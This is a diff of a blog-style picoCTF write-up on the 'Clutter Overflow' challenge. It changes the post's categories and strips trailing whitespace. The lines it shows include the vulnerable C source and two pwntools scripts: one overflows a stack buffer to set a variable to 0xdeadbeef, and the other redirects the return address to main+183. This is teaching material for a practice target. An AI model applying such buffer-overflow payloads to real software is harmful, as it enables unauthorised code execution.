@@ -3,7 +3,7 @@ title: Clutter Overflow
 description: Clutter, clutter everywhere and not a byte to use.
 author: 5o1z
 date: 2024-11-30 9:57 +0700
-categories: [Practice, PicoCTF]
+categories: [PicoCTF, Pwn]
 tags: [pwn, pwntools, code]
 image:
   path: /assets/img/picoCTF/picoctf.png
@@ -30,7 +30,7 @@ And here is its source code:
 #define SIZE 0x100
 #define GOAL 0xdeadbeef
 
-const char* HEADER = 
+const char* HEADER =
 " ______________________________________________________________________\n"
 "|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|\n"
 "| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |\n"
@@ -59,8 +59,8 @@ int main(void)
   setbuf(stdout, NULL);
   setbuf(stdin, NULL);
   setbuf(stderr, NULL);
- 	
-  puts(HEADER); 
+
+  puts(HEADER);
   puts("My room is so cluttered...");
   puts("What do you see?");
 
@@ -255,7 +255,7 @@ So our offset is 264, and that's enough for us to write an exploit.
 
 from pwn import *
 
-# context.log_level = 'debug' 
+# context.log_level = 'debug'
 exe = context.binary = ELF('./chall', checksec=False)
 
 
@@ -284,17 +284,17 @@ c
 ''')
 
 p = remote('mars.picoctf.net', 31890) if args.REMOTE else process(argv=[exe.path], aslr=False)
-if args.GDB: 
+if args.GDB:
     GDB()
     input()
 
 # ===========================================================
-#                          EXPLOIT 
+#                          EXPLOIT
 # ===========================================================
 
 
-pl = b'A'*280 + p64(0xdeadbeef) 
- 
+pl = b'A'*280 + p64(0xdeadbeef)
+
 sl(pl)
 
 p.interactive()
@@ -420,7 +420,7 @@ Here I will let it return **main+183**
 
 from pwn import *
 
-# context.log_level = 'debug' 
+# context.log_level = 'debug'
 exe = context.binary = ELF('./chall', checksec=False)
 
 
@@ -449,17 +449,17 @@ c
 ''')
 
 p = remote('mars.picoctf.net', 31890) if args.REMOTE else process(argv=[exe.path], aslr=False)
-if args.GDB: 
+if args.GDB:
     GDB()
     input()
 
 # ===========================================================
-#                          EXPLOIT 
+#                          EXPLOIT
 # ===========================================================
 
 
-pl = b'A'*280 + p64(exe.sym['main']+183) 
- 
+pl = b'A'*280 + p64(exe.sym['main']+183)
+
 sl(pl)
 
 p.interactive()
